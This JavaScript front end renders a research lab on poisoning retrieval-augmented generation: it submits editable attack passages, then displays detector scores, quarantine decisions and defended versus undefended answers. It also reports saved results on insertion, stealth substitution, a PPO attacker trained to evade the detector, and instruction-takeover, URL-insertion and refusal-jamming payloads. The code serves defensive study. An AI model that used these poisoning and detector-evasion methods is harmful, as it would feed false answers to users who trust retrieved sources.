/* Interactive validation lab. The server executes retrieval and detection; this file only renders it. */
(() => {
  const el = id => document.getElementById(id);
  const escapeHtml = value => String(value ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
  const percent = value => `${Math.round(Number(value || 0) * 100)}%`;
  const count = (rate, n = 75) => `${Math.round(Number(rate || 0) * n)}/${n}`;
  let cases = [];

  async function jsonRequest(url, options) {
    const response = await fetch(url, options);
    const body = await response.json();
    if (!response.ok) throw new Error(body.detail || `Request failed (${response.status})`);
    return body;
  }

  function selectedCase() { return cases.find(row => row.qid === el('lab-case').value); }

  function resetPayload() {
    const item = selectedCase();
    if (!item) return;
    const text = el('lab-strategy').value === 'stealth' ? item.stealth_text : item.greedy_text;
    for (const id of ['lab-payload', 'lab-payload-2', 'lab-payload-3']) el(id).value = text;
  }

  function syncBudget() {
    const budget = Number(el('lab-budget').value);
    for (const number of [2, 3]) {
      el(`lab-extra-${number}`).hidden = number > budget;
      if (number <= budget && !el(`lab-payload-${number}`).value.trim()) {
        el(`lab-payload-${number}`).value = el('lab-payload').value;
      }
    }
  }

  function chooseCase() {
    const item = selectedCase();
    if (!item) return;
    el('lab-original').textContent = item.original_text;
    el('lab-case-note').textContent = item.saved_stealth_failure
      ? 'Saved hashing run: the answer substitution passed the defense. Edit the payload to probe why.'
      : 'Saved hashing run: this substitution did not produce a defended wrong answer. You can edit the payload and rerun.';
    resetPayload();
    if (item.qid.startsWith('msmarco-v3-')) {
      el('lab-ppo-case-label').textContent = `${item.qid} · PPO traces are historical v1 examples and are not query-aligned to v3.`;
      el('lab-ppo-traces').textContent = 'PPO trace archive uses a different v1 question set; no aligned trace is available for this v3 case.';
    } else {
      loadPpoCase(item.qid);
    }
  }

  function featureCard(name, value) {
    return `<div class="lab-feature"><span>${escapeHtml(name.replaceAll('_', ' ').toUpperCase())}</span><strong>${Number(value).toFixed(3)}</strong></div>`;
  }

  function documentCard(doc) {
    const risk = Math.max(0, Math.min(100, Math.round(doc.risk * 100)));
    const featureRows = Object.entries(doc.features).map(([key, value]) => featureCard(key, value)).join('');
    const evidence = doc.evidence_screen || {};
    const changed = evidence.changed_claim_pair;
    const sourceComparison = changed
      ? `<p><b>Pinned source sentence:</b> ${escapeHtml(changed.source_sentence)}</p><p><b>Retrieved sentence:</b> ${escapeHtml(changed.candidate_sentence)}</p>`
      : '';
    return `<details class="lab-doc ${doc.is_attack ? 'attack' : ''} ${doc.decision === 'quarantine' ? 'quarantined' : 'accepted'}" ${doc.is_attack ? 'open' : ''}>
      <summary><span>#${doc.rank}</span><strong>DOC ${doc.doc_id}${doc.is_attack ? ' / ALTERED' : ''}</strong><span>RISK ${risk}%</span><em>${doc.decision.toUpperCase()}</em></summary>
      <div class="lab-doc-body"><div class="lab-doc-meta"><span>BM25 RANK ${doc.bm25_rank}</span><span>DENSE RANK ${doc.dense_rank}</span><span>RRF ${Number(doc.rrf_score).toFixed(4)}</span><span>INGEST SHA-256 ${escapeHtml(doc.integrity.toUpperCase())}</span><span>PINNED SOURCE ${escapeHtml(evidence.snapshot_status || 'unavailable').toUpperCase()}</span></div><p>${escapeHtml(doc.text)}</p>${sourceComparison}<p><b>Source decision:</b> ${escapeHtml(evidence.reason || 'not_run').replaceAll('_', ' ')}. This check does not establish factual truth.</p><div class="lab-risk-track"><i style="width:${risk}%"></i></div><div class="lab-feature-grid">${featureRows}</div><div class="lab-doc-meta" style="margin-top:12px">SHA-256 ${escapeHtml(doc.sha256)}</div></div>
    </details>`;
  }

  function renderRun(data) {
    el('lab-time').textContent = `${Math.round(data.latency_ms)} MS / ${data.execution.replaceAll('_', ' ').toUpperCase()}`;
    el('lab-status').dataset.state = 'ok';
    el('lab-status').textContent = `${data.documents.length} passages retrieved · attack ${data.attack_retrieved_count}/${data.attack_budget} in top five · ${data.attack_quarantined_count} quarantined · ${data.attack_payloads_distinct} unique attacker texts · threshold ${Number(data.detector_threshold).toFixed(3)}`;
    el('lab-off-answer').textContent = data.undefended.answer;
    el('lab-on-answer').textContent = data.defended.answer;
    el('lab-guard-answer').textContent = data.snapshot_guarded.answer;
    el('lab-evidence-answer').textContent = data.evidence_defended.answer;
    el('lab-clean-answer').textContent = data.clean.answer;
    el('lab-off-source').textContent = `SOURCE DOC ${data.undefended.source_doc_id ?? 'NONE'}`;
    el('lab-on-source').textContent = `SOURCE DOC ${data.defended.source_doc_id ?? 'NONE'}`;
    el('lab-guard-source').textContent = `SOURCE DOC ${data.snapshot_guarded.source_doc_id ?? 'NONE'} · ${data.snapshot_guard.reason.replaceAll('_', ' ')}`;
    el('lab-clean-source').textContent = `SOURCE DOC ${data.clean.source_doc_id ?? 'NONE'} · DIAGNOSTIC, NOT EMITTED`;
    el('lab-evidence-source').textContent = `SOURCE DOC ${data.evidence_defended.source_doc_id ?? 'NONE'} · ${data.evidence_attack_quarantined_count}/${data.attack_retrieved_count} retrieved attack passages excluded by the pinned source check`;
    const verdict = el('lab-verdict');
    if (data.defended_attack_success) {
      verdict.className = 'lab-verdict failure';
      verdict.textContent = 'Observed failure: the altered passage supplied the defended wrong answer. The integrity check and detector did not remove it.';
    } else if (data.attack_quarantined) {
      verdict.className = 'lab-verdict';
      verdict.textContent = `All retrieved attack passages were quarantined. ${data.surface === 'post_index_tamper' ? 'The protected clean snapshot detected post-index changes or new documents.' : 'The research detector flagged the accepted passages.'}`;
    } else if (data.defended_source_is_attack) {
      verdict.className = 'lab-verdict failure';
      verdict.textContent = 'An altered passage remained the defended answer source. The saved target phrase was not returned; inspect the answer and compare with the original passage.';
    } else {
      verdict.className = 'lab-verdict';
      verdict.textContent = data.attack_retrieved ? 'Altered passages were retrieved but did not supply the defended answer.' : 'No altered passage reached the top five retrieved passages.';
    }
    verdict.textContent += data.snapshot_guard.decision === 'allow'
      ? ' The pinned snapshot verified the emitted source and cited span.'
      : data.snapshot_guard.decision === 'recover'
        ? ` Independent question-only retrieval recovered a cited answer from pinned DOC ${data.snapshot_guard.recovery_source_id}.`
        : ` The pinned snapshot could not recover an answer (${data.snapshot_guard.reason.replaceAll('_', ' ')}).`;
    if (data.attack_retrieved) {
      verdict.textContent += data.evidence_attack_quarantined
        ? ' Source screening excluded every retrieved altered passage before its answer path ran.'
        : ' At least one retrieved altered passage passed the source screen.';
    }
    const citation = data.defended.citations?.[0];
    const timing = data.stage_times || {};
    const changed = (data.counterfactuals || []).filter(row => row.answer_changed);
    el('lab-inference-details').innerHTML = `<p><b>Selected evidence:</b> ${citation ? `DOC ${escapeHtml(citation.doc_id)} / ${escapeHtml(citation.span)}` : 'Abstained - no accepted source span.'}</p>
      <p><b>Backend:</b> ${escapeHtml(data.defended.backend)} · <b>Stage time:</b> setup + indexing ${Number(timing.setup_and_index_ms || 0).toFixed(1)} ms, retrieval ${Number(timing.retrieval_ms || 0).toFixed(1)} ms, integrity ${Number(timing.integrity_ms || 0).toFixed(1)} ms, detector ${Number(timing.detection_ms || 0).toFixed(1)} ms, answer + leave-one-out ${Number(timing.answer_and_loo_ms || 0).toFixed(1)} ms.</p>
      <p><b>Independent-origin check:</b> ${data.provenance?.enforced ? escapeHtml(data.provenance.reason) : 'Not applied; this benchmark has no reviewed independent source origins.'}</p>
      <p><b>Pinned snapshot:</b> ${escapeHtml(data.snapshot_guard.decision.toUpperCase())} · ${escapeHtml(data.snapshot_guard.reason.replaceAll('_', ' '))} · source ${escapeHtml(data.snapshot_guard.source_status ?? 'none')} · exact cited span ${data.snapshot_guard.span_verified ? 'verified' : 'unavailable'}.</p>
      <p><b>Independent recovery:</b> ${data.snapshot_guard.recovery_attempted ? 'attempted' : 'not needed'} · source DOC ${escapeHtml(data.snapshot_guard.recovery_source_id ?? 'none')} · source status ${escapeHtml(data.snapshot_guard.recovery_source_status ?? 'not checked')} · top five ${escapeHtml((data.snapshot_guard.independent_top_five_ids || []).join(', '))}.</p>
      <p><b>Snapshot SHA-256:</b> ${escapeHtml(data.snapshot_guard.snapshot_corpus_sha256)}<br><b>Selected source SHA-256:</b> ${escapeHtml(data.snapshot_guard.source_sha256 ?? 'none')}<br><b>Expected source SHA-256:</b> ${escapeHtml(data.snapshot_guard.expected_sha256 ?? 'none')}</p>
      <details><summary>${changed.length} of ${(data.counterfactuals || []).length} accepted passages changed the answer when removed</summary><ul>${(data.counterfactuals || []).map(row => `<li>Remove DOC ${escapeHtml(row.removed_doc_id)}: ${row.answer_changed ? 'answer changed to' : 'answer unchanged'} ${escapeHtml(row.answer_after_removal)}</li>`).join('')}</ul></details>`;
    el('lab-candidate-count').textContent = `${data.documents.length} CANDIDATES`;
    el('lab-documents').innerHTML = data.documents.map(documentCard).join('');
  }

  async function runLab() {
    const button = el('lab-run');
    button.disabled = true;
    el('lab-status').dataset.state = 'loading';
    el('lab-status').textContent = 'Staging document, building index, scoring eight features…';
    try {
      const data = await jsonRequest('/api/lab/run', {
        method: 'POST', headers: {'Content-Type':'application/json'},
        body: JSON.stringify({
          qid: el('lab-case').value,
          strategy: el('lab-strategy').value,
          surface: el('lab-surface').value,
          attack_budget: Number(el('lab-budget').value),
          attack_text: el('lab-payload').value,
          additional_attack_texts: [2, 3].slice(0, Number(el('lab-budget').value) - 1).map(number => el(`lab-payload-${number}`).value),
        }),
      });
      renderRun(data);
    } catch (error) {
      el('lab-status').dataset.state = 'error';
      el('lab-status').textContent = error.message;
    } finally { button.disabled = false; }
  }

  async function loadCases() {
    try {
      const data = await jsonRequest('/api/lab/cases');
      cases = data.cases;
      el('lab-case').innerHTML = cases.map(row => `<option value="${escapeHtml(row.qid)}">${row.saved_stealth_failure ? '● ' : ''}${escapeHtml(row.question)} / ${escapeHtml(row.qid)}</option>`).join('');
      el('lab-case').value = data.default_qid;
      chooseCase();
      await runLab();
    } catch (error) {
      el('lab-status').dataset.state = 'error';
      el('lab-status').textContent = error.message;
    }
  }

  function barRow(label, value, isAfter = false) {
    const width = Math.max(0, Math.min(100, Math.round(Number(value || 0) * 100)));
    return `<div class="lab-bar-row ${isAfter ? 'after' : ''}"><span>${label}</span><div><i style="width:${width}%"></i></div><b>${width}%</b></div>`;
  }

  async function loadTest() {
    try {
      const data = await jsonRequest('/api/test-summary');
      if (!data.available) throw new Error('Sealed test evidence is unavailable');
      const {clean, greedy, stealth} = data.summaries;
      el('lab-greedy-result').textContent = `${count(greedy.undefended_attack_success_rate)} → ${count(greedy.defended_attack_success_rate)}`;
      el('lab-stealth-result').textContent = `${count(stealth.undefended_attack_success_rate)} → ${count(stealth.defended_attack_success_rate)}`;
      el('lab-clean-result').textContent = count(clean.alias_match_accuracy);
      el('lab-greedy-bars').innerHTML = barRow('BEFORE', greedy.undefended_attack_success_rate) + barRow('AFTER', greedy.defended_attack_success_rate, true);
      el('lab-stealth-bars').innerHTML = barRow('BEFORE', stealth.undefended_attack_success_rate) + barRow('AFTER', stealth.defended_attack_success_rate, true);
      el('lab-clean-bars').innerHTML = barRow('MATCH', clean.alias_match_accuracy, true);
      el('lab-test-status').textContent = 'First frozen test setup (v1): 75 questions per attack family. The server verified file hashes and case counts. This test is historical evidence for that setup.';
    } catch (error) { el('lab-test-status').textContent = error.message; }
  }

  async function loadV3() {
    try {
      const data = await jsonRequest('/api/research-summary');
      const s = data.summaries;
      if (s.v3_defense_greedy) {
        el('lab-greedy-v3-result').textContent = `${count(s.v3_defense_greedy.undefended_attack_success_rate, 150)} → ${count(s.v3_defense_greedy.defended_attack_success_rate, 150)}`;
        el('lab-greedy-v3-bars').innerHTML = barRow('BEFORE', s.v3_defense_greedy.undefended_attack_success_rate) + barRow('AFTER', s.v3_defense_greedy.defended_attack_success_rate, true);
      }
      if (s.v3_defense_stealth) {
        el('lab-stealth-v3-result').textContent = `${count(s.v3_defense_stealth.undefended_attack_success_rate, 150)} → ${count(s.v3_defense_stealth.defended_attack_success_rate, 150)}`;
        el('lab-stealth-v3-bars').innerHTML = barRow('BEFORE', s.v3_defense_stealth.undefended_attack_success_rate) + barRow('AFTER', s.v3_defense_stealth.defended_attack_success_rate, true);
      }
      if (s.v3_retrieval) {
        const r = s.v3_retrieval.splits.validation;
        el('lab-retrieval-v3-result').textContent = `${count(r.recall_at_1, 150)} → ${count(r.recall_at_5, 150)}`;
        el('lab-retrieval-v3-bars').innerHTML = barRow('R@1', r.recall_at_1) + barRow('R@5', r.recall_at_5, true);
      }
      if (s.v3_clean_minilm) {
        el('lab-clean-v3-result').textContent = count(s.v3_clean_minilm.alias_match_accuracy, 150);
        el('lab-clean-v3-bars').innerHTML = barRow('MATCH', s.v3_clean_minilm.alias_match_accuracy, true);
      }
    } catch (error) { /* v3 cards keep placeholders when summaries are unavailable */ }
  }

  async function loadDefenderRl() {
    const container = el('lab-defender-rl');
    try {
      const report = await jsonRequest('/api/lab/defender-rl');
      const names = [['frozen_v3', 'Frozen v3'], ['supervised_warmstart', 'Supervised warm-start'],
        ['ppo_seed_11', 'PPO seed 11'], ['ppo_seed_22', 'PPO seed 22'], ['ppo_seed_33', 'PPO seed 33']];
      const rows = names.map(([key, label]) => {
        const row = report.models[key];
        return `<tr><th scope="row">${escapeHtml(label)}</th><td>${row.clean_flags}/${row.clean_documents}</td><td>${row.poisonedrag_caught}/${row.poisonedrag_documents}</td><td>${row.gaslite_caught}/${row.gaslite_documents}</td></tr>`;
      }).join('');
      container.innerHTML = `<p><b>Result: ${report.gate_passed ? 'passed' : 'failed'}.</b> ${report.training_rows} training rows; ${report.ppo_sampled_actions_per_seed.toLocaleString()} sampled RL actions per seed. Cutoffs were set on separate clean calibration questions. These are development results, not a deployed policy.</p>
        <div class="lab-rl-table-wrap"><table class="lab-rl-table"><thead><tr><th>Policy</th><th>Clean flags</th><th>PoisonedRAG caught</th><th>GasLite caught</th></tr></thead><tbody>${rows}</tbody></table></div>
        <p>${escapeHtml(report.limitation)} PoisonedRAG gains coincided with too many clean flags, and learned policies missed GasLite.</p>`;
    } catch (error) { container.textContent = error.message; }
  }

  async function loadSnapshotSummary() {
    const container = el('lab-snapshot-summary');
    try {
      const report = await jsonRequest('/api/lab/snapshot-recovery');
      const names = [
        ['greedy:accepted_ingest', 'Insertion · accepted ingest'],
        ['greedy:post_index_tamper', 'Insertion · post-index tamper'],
        ['stealth:accepted_ingest', 'Substitution · accepted ingest'],
        ['stealth:post_index_tamper', 'Substitution · post-index tamper'],
      ];
      const rows = names.map(([key, label]) => {
        const row = report.attack_replays[key];
        return `<tr><th scope="row">${escapeHtml(label)}</th><td>${row.v3_attack_source_success} → ${row.guard_attack_source_success}</td><td>${row.guard_alias_match}/${row.cases}</td><td>${row.guard_abstained}/${row.cases}</td><td>${row.guard_recovered_answers}/${row.cases}</td></tr>`;
      }).join('');
      container.innerHTML = `<p><b>Clean, unmodified corpus:</b> exact-alias matches ${report.clean.v3_alias_matches}/${report.clean.questions} with v3 and ${report.clean.guard_alias_matches}/${report.clean.questions} with snapshot recovery. The snapshot is checked against SHA-256 ${escapeHtml(report.snapshot_corpus_sha256)}.</p>
        <div class="lab-rl-table-wrap"><table class="lab-rl-table"><thead><tr><th>Attack surface</th><th>Attack-sourced answers: v3 → guard</th><th>Guard clean aliases</th><th>Guard abstentions</th><th>Recovered answers</th></tr></thead><tbody>${rows}</tbody></table></div>
        <p>${escapeHtml(report.limitation)} These are previously inspected validation questions; source verification does not certify factual truth.</p>`;
    } catch (error) { container.textContent = error.message; }
  }

  async function loadEvidenceSummary() {
    const container = el('lab-evidence-summary');
    try {
      const report = await jsonRequest('/api/lab/evidence-screen');
      const source = report.live_replay;
      const factual = report.model_diagnostic;
      const qa = report.qa_diagnostic;
      container.innerHTML = `<p><b>Pinned source decision:</b> ${report.attacks.greedy.quarantined}/${report.attacks.greedy.total} new attack passages and ${report.attacks.stealth.quarantined}/${report.attacks.stealth.total} substituted passages excluded; ${report.clean.quarantined}/${report.clean.total} unchanged passages excluded.</p>
        <p><b>Live replay of old detector failures:</b> ${source.previous_v3_attack_success}/${source.cases} attack-sourced answers with v3 became ${source.source_screen_attack_success}/${source.cases} with source screening; ${source.source_screen_clean_alias_match}/${source.cases} clean aliases were returned and ${source.source_screen_abstained}/${source.cases} abstained.</p>
        <p><b>Factual model diagnostic:</b> ${factual.at_least_0_5}/${factual.count} changed sentences had refutation probability at least 0.5. The question-answering model extracted different spans in ${qa.answer_disagreements}/${qa.count}, falling to ${qa.disagreements_by_minimum_confidence['0.05']}/${qa.count} when both span confidences had to reach 0.05. These model scores have no calibrated clean-revision false-flag rate and do not drive quarantine.</p>
        <p>${escapeHtml(report.limitation)} The cases were previously inspected validation examples. <a href="https://github.com/tanmaysachann/rag-poisoning/blob/main/EVIDENCE_CLAIM_SCREEN.md" target="_blank" rel="noopener noreferrer">Read the method and limits</a>.</p>`;
    } catch (error) { container.textContent = error.message; }
  }

  async function loadFullCorpus() {
    const container = el('lab-full-corpus');
    try {
      const report = await jsonRequest('/api/lab/full-corpus');
      const rows = [
        ['V17 · first 500 questions', report.v17],
        ['V18 · frozen policy on next 500', report.v18_baseline],
        ['V18 · learned selector on same 500', report.v18_learned],
        ['V19 · frozen policy on third 500', report.v19_baseline],
        ['V19 · trained text selector on same 500', report.v19_trained],
      ].map(([label, row]) => `<tr><th scope="row">${escapeHtml(label)}</th><td>${row.strict_match}/${row.questions}</td><td>${row.nonmatching_emitted}/${row.questions}</td><td>${row.abstained}/${row.questions}</td></tr>`).join('');
      container.innerHTML = `<p><b>V19 scale gate failed.</b> ${report.corpus_passages.toLocaleString()} indexed passages were searched; the text model trained on ${report.v19_training_candidates.toLocaleString()} extracted candidates from ${report.v19_training_questions.toLocaleString()} questions. On its fresh ${report.questions_per_evaluation} questions, it got ${report.v19_trained.strict_match} correct and ${report.v19_trained.nonmatching_emitted} nonmatching answers, versus ${report.v19_baseline.strict_match} correct and ${report.v19_baseline.nonmatching_emitted} nonmatching answers for the frozen policy.</p>
        <div class="lab-rl-table-wrap"><table class="lab-rl-table"><thead><tr><th>Answer policy</th><th>Exact correct</th><th>Nonmatching answer</th><th>Abstained</th></tr></thead><tbody>${rows}</tbody></table></div>
        <p>In v19, the reader produced an exact answer candidate in ${report.v19_reader_exact_candidate}/500 questions; the text selector ranked one first in ${report.v19_unthresholded_top_candidate_exact}/500, then emitted ${report.v19_trained.strict_match}/500 correct after its calibrated cutoff. Unverified emissions: ${report.v19_unverified_emissions}. ${escapeHtml(report.limitation)} No attack-resistance claim is made from these runs. <a href="https://github.com/tanmaysachann/rag-poisoning/blob/main/FULL_CORPUS_V19.md" target="_blank" rel="noopener noreferrer">Read the protocol and full results</a>.</p>`;
    } catch (error) { container.textContent = error.message; }
  }

  async function loadGeneralization() {
    try {
      const data = await jsonRequest('/api/generalization-summary');
      const s = data.summary;
      const clean = s.clean_control;
      el('lab-generalization-clean').textContent = `${clean.baseline_alias_match}/${clean.cases} → ${clean.detector_alias_match}/${clean.cases}`;
      const rows = [
        ['faq_record', 'lab-generalization-faq'],
        ['correction_notice', 'lab-generalization-correction'],
        ['catalog_record', 'lab-generalization-catalog'],
      ];
      for (const [key, id] of rows) {
        const row = s.paired_attack_families[key];
        const ci = row.paired_reduction_bootstrap_95;
        const pp = value => `${(Number(value) * 100).toFixed(1)}%`;
        el(id).textContent = `${row.attack_success_before}/${row.cases} → ${row.attack_success_after_detector}/${row.cases}`;
        const card = el(id).closest('.lab-evidence-card');
        card.querySelector('p').textContent = `Paired reduction ${(row.paired_absolute_reduction * 100).toFixed(1)} percentage points (bootstrap 95% CI ${pp(ci.lower)}–${pp(ci.upper)}); ${row.attack_quarantine_rate_given_retrieval == null ? '—' : pp(row.attack_quarantine_rate_given_retrieval)} quarantined when retrieved.`;
      }
      const proof = data.verification;
      el('lab-generalization-status').textContent = `Verified frozen ${s.split} protocol · ${proof.queries} paired questions per family · detector threshold ${Number(s.detector_threshold).toFixed(3)} · protocol ${String(s.protocol_sha256).slice(0, 12)}… · outputs and input hashes checked.`;
    } catch (error) {
      el('lab-generalization-status').textContent = `Frozen held-out evidence unavailable: ${error.message}`;
    }
  }

  function plotPpo(plain, defended) {
    const x = index => 47 + index * 69;
    const y = value => 192 - Math.max(0, Math.min(1, Number(value || 0))) * 159;
    const path = (rows, key) => rows.map((row, index) => `${index ? 'L' : 'M'} ${x(index)} ${y(row[key])}`).join(' ');
    const grid = [0, .5, 1].map(v => `<line x1="47" y1="${y(v)}" x2="690" y2="${y(v)}" stroke="#d5dce2" stroke-dasharray="${v ? '3 4' : '0'}"/><text x="5" y="${y(v) + 4}" fill="#5d6b76" font-size="10">${Math.round(v * 100)}%</text>`).join('');
    const ticks = plain.map((_, index) => `<text x="${x(index)}" y="218" text-anchor="middle" fill="#5d6b76" font-size="10">${(index + 1) * 20}</text>`).join('');
    const points = (rows, key, color) => rows.map((row, index) => `<circle cx="${x(index)}" cy="${y(row[key])}" r="4" fill="${color}"><title>Batch ${index + 1}: ${Math.round(row[key] * 100)}%</title></circle>`).join('');
    el('lab-ppo-chart').innerHTML = `${grid}<path d="${path(plain, 'attack_success_rate')}" fill="none" stroke="#155a8a" stroke-width="3"/>${points(plain, 'attack_success_rate', '#155a8a')}<path d="${path(defended, 'defended_attack_success_rate')}" fill="none" stroke="#a63732" stroke-width="3"/>${points(defended, 'defended_attack_success_rate', '#a63732')}${ticks}<text x="688" y="238" text-anchor="end" fill="#5d6b76" font-size="10">EPISODES</text>`;
  }

  async function loadPpo() {
    try {
      const data = await jsonRequest('/api/lab/ppo');
      plotPpo(data.runs.undefended, data.runs.defender_aware);
      el('lab-ppo-plain').textContent = count(data.validation.undefended.attack_success_rate);
      el('lab-ppo-defender').textContent = count(data.validation.defender_aware.defended_attack_success_rate);
      el('lab-ppo-fixed').textContent = count(data.validation.fixed_insertion.attack_success_rate);
      // The matched fixed substitution is the frozen hashing defense baseline.
      const summary = await jsonRequest('/api/research-summary');
      el('lab-ppo-stealth-fixed').textContent = count(summary.summaries.defense_stealth?.defended_attack_success_rate);
      const multi = summary.summaries.ppo_multiseed;
      if (multi) el('lab-ppo-multiseed').textContent = `Three matched validation seeds, 75 questions each: PPO ${multi.ppo_successes}/${multi.total_paired_cases} defended successes; fixed answer substitution ${multi.fixed_substitution_successes}/${multi.total_paired_cases}; random edits ${multi.random_edit_successes}/${multi.total_paired_cases}. PPO minus fixed: ${Math.round(multi.paired_difference_rate * 1000) / 10} percentage points (query-cluster bootstrap 95% interval ${multi.query_cluster_bootstrap_95pct_difference.map(value => `${Math.round(value * 1000) / 10}`).join(' to ')}). PPO beat random edits but did not beat fixed substitution.`;
      const ablation = summary.summaries.ppo_detection_ablation;
      if (ablation) el('lab-ppo-ablation').textContent = `Reward ablation, same three seeds and questions: with detector-risk step shaping ${ablation.original_successes}/${ablation.total_paired_cases} defended successes; without it ${ablation.no_detection_reward_successes}/${ablation.total_paired_cases}. The terminal defended-success reward remained in both runs. This development result supports the shaping term for this PPO setup, not a general policy advantage.`;
      const proxyAblation = summary.summaries.ppo_proxy_ablation;
      if (proxyAblation) el('lab-ppo-proxy-ablation').textContent = `Auxiliary critic ablation, same seeds and questions: ${proxyAblation.original_successes}/${proxyAblation.total_paired_cases} defended successes with its training loss, ${proxyAblation.no_proxy_value_successes}/${proxyAblation.total_paired_cases} without. No deterministic validation case outcome changed.`;
      const cacheAblation = summary.summaries.ppo_cache_ablation;
      if (cacheAblation) el('lab-ppo-cache-ablation').textContent = `Edit-effect cache ablation, same seeds and questions: ${cacheAblation.original_successes}/${cacheAblation.total_paired_cases} defended successes without cache shaping, ${cacheAblation.cache_successes}/${cacheAblation.total_paired_cases} with it. No deterministic validation case outcome changed. The cache predicted step reward, not final attack success.`;
      const headAblation = summary.summaries.ppo_head_ablation;
      if (headAblation) el('lab-ppo-head-ablation').textContent = `Action-head conditioning ablation, same seeds and questions: ${headAblation.original_successes}/${headAblation.total_paired_cases} defended successes with chosen-action inputs, ${headAblation.no_head_conditioning_successes}/${headAblation.total_paired_cases} without. No deterministic validation case outcome changed; action masks remained active.`;
      const v2 = summary.summaries.v2_paired_gate;
      if (v2) el('lab-v2-summary').textContent = `On 30 validation questions, the full-context cosine gate left attack success at ${v2.attack_success_before_gate}/${v2.cases} → ${v2.attack_success_after_gate}/${v2.cases} while clean alias matches fell ${v2.clean_answer_alias_before_gate}/${v2.cases} → ${v2.clean_answer_alias_after_gate}/${v2.cases}. It was not deployed.`;
      const layouts = summary.summaries.unseen_templates?.styles;
      if (layouts) el('lab-unseen-summary').textContent = `Three overt answer layouts were tested on the same 75 development questions. All ${Object.values(layouts).reduce((total, row) => total + row.cases, 0)} altered documents were quarantined; defended attack success was ${Object.values(layouts).reduce((total, row) => total + row.defended_attack_successes, 0)}. These probes do not establish unseen-source robustness.`;
      const budgets = summary.summaries.poison_budget?.budgets;
      if (budgets) el('lab-budget-summary').textContent = `With one, two, or three identical accepted stealth passages, defended wrong answers occurred in ${budgets['1'].defended_attack_successes}/75, ${budgets['2'].defended_attack_successes}/75, and ${budgets['3'].defended_attack_successes}/75 validation cases. Copies share one attacker origin; this is not a varied-attack guarantee.`;
      const undefendedMulti = summary.summaries.ppo_multiseed_undefended;
      if (undefendedMulti) el('lab-ppo-undefended-multiseed').textContent = `Undefended three-seed comparison, 75 questions each: PPO ${undefendedMulti.ppo_successes}/${undefendedMulti.total_paired_cases} attack successes; greedy insertion ${undefendedMulti.greedy_insertion_successes}/${undefendedMulti.total_paired_cases}; random edits ${undefendedMulti.random_edit_successes}/${undefendedMulti.total_paired_cases}. PPO tied greedy insertion on every seed and beat random edits. No PPO advantage is claimed.`;
      const families = summary.summaries.payload_families?.families;
      if (families) el('lab-payload-families').textContent = `Query-aware overt payloads on 75 validation questions each, all quarantined when retrieved. Undefended → defended successes: instruction takeover ${families.instruction_takeover.undefended_attack_successes} → ${families.instruction_takeover.defended_attack_successes}, URL insertion ${families.url_insertion.undefended_attack_successes} → ${families.url_insertion.defended_attack_successes}, refusal jamming ${families.refusal_jamming.undefended_attack_successes} → ${families.refusal_jamming.defended_attack_successes}. Behavior signals catch overt goals; stealth substitution still bypasses.`;
      const corroboration = summary.summaries.v2_corroboration;
      if (corroboration) el('lab-v2-corroboration').textContent = `Token-F1 disagreement-abstain probe on 30 v2 validation questions (train threshold ${Number(corroboration.train_calibrated_token_f1_threshold).toFixed(2)}): clean alias matches ${corroboration.clean_answer_alias_before_gate}/${corroboration.cases} → ${corroboration.clean_answer_alias_after_gate}/${corroboration.cases}, attack success ${corroboration.attack_success_before_gate}/${corroboration.cases} → ${corroboration.attack_success_after_gate}/${corroboration.cases}. No acceptable tradeoff; not deployed.`;
      const cited = summary.summaries.cited_extractive;
      if (cited) el('lab-cited-extractive').textContent = `On 20 clean validation questions, ranker sentence plus source citation gave ${cited.cited_extractive_valid_citations}/${cited.cases} span-valid citations and ${cited.cited_extractive_alias_match}/${cited.cases} alias matches, versus Qwen's ${cited.same_questions_qwen_cited_support}/${cited.cases} cited support and ${cited.same_questions_qwen_alias_match}/${cited.cases} alias match. Citation formatting alone beats the 0.5B model here; it is not used for live answers.`;
      const answerKey = summary.summaries.v2_answer_key;
      if (answerKey) el('lab-v2-answer-key').textContent = `Answer-key containment probe on ${answerKey.cases} v2 validation questions (train-selected ${answerKey.train_selected_mode} mode; 5% budget infeasible on train): attacks ${answerKey.attack_success_before_gate}/${answerKey.cases} → ${answerKey.attack_success_after_gate}/${answerKey.cases}, clean alias ${answerKey.clean_answer_alias_before_gate}/${answerKey.cases} → ${answerKey.clean_answer_alias_after_gate}/${answerKey.cases} with ${answerKey.clean_answer_kept}/${answerKey.cases} kept. Catches attacks but not clean-safe; not deployed.`;
      const perplexity = summary.summaries.perplexity;
      if (perplexity) el('lab-perplexity').textContent = `Qwen token-likelihood probe on 75 clean vs 75 substituted passages (${perplexity.train_clean_cases} train-clean calibration): clean FPR ${Math.round(perplexity.clean_fpr * 1000) / 10}%, attack recall ${Math.round(perplexity.attack_recall * 1000) / 10}% (13/75), ROC-AUC ${Math.round(perplexity.roc_auc * 100) / 100}. Best stealth content signal measured, still diagnostic at full LM-inference cost.`;
    } catch (error) { el('lab-ppo-chart').outerHTML = `<p class="lab-evidence-caption">${escapeHtml(error.message)}</p>`; }
  }

  async function loadPpoCase(qid) {
    el('lab-ppo-case-label').textContent = qid;
    try {
      const data = await jsonRequest(`/api/lab/ppo-case?qid=${encodeURIComponent(qid)}`);
      el('lab-ppo-traces').innerHTML = Object.entries(data.runs).map(([name, run]) => {
        const steps = run.trace.map(step => `<li>${escapeHtml(step.operation)} / position ${escapeHtml(step.position)} / payload ${escapeHtml(step.payload)} / reward ${Number(step.reward).toFixed(2)}</li>`).join('');
        const result = run.defended_attack_success == null ? `Undefended attack success: ${run.attack_success ? 'yes' : 'no'}` : `Defended attack success: ${run.defended_attack_success ? 'yes' : 'no'} · detector flagged: ${run.attack_doc_detected ? 'yes' : 'no'}`;
        return `<div class="lab-policy-trace"><span>${escapeHtml(name.replaceAll('_', ' ').toUpperCase())}</span><h4>${escapeHtml(result)}</h4><ol>${steps}</ol><details><summary>Show final edited passage</summary><p>${escapeHtml(run.final_document)}</p></details></div>`;
      }).join('');
    } catch (error) { el('lab-ppo-traces').textContent = error.message; }
  }

  el('lab-case').addEventListener('change', chooseCase);
  el('lab-strategy').addEventListener('change', resetPayload);
  el('lab-budget').addEventListener('change', syncBudget);
  el('lab-reset').addEventListener('click', resetPayload);
  el('lab-run').addEventListener('click', runLab);
  let archiveLoaded = false;
  document.querySelector('[data-view="research"]').addEventListener('click', () => {
    if (archiveLoaded) return;
    archiveLoaded = true;
    loadCases(); loadTest(); loadPpo(); loadV3(); loadGeneralization();
    loadDefenderRl(); loadSnapshotSummary(); loadEvidenceSummary(); loadFullCorpus();
  });
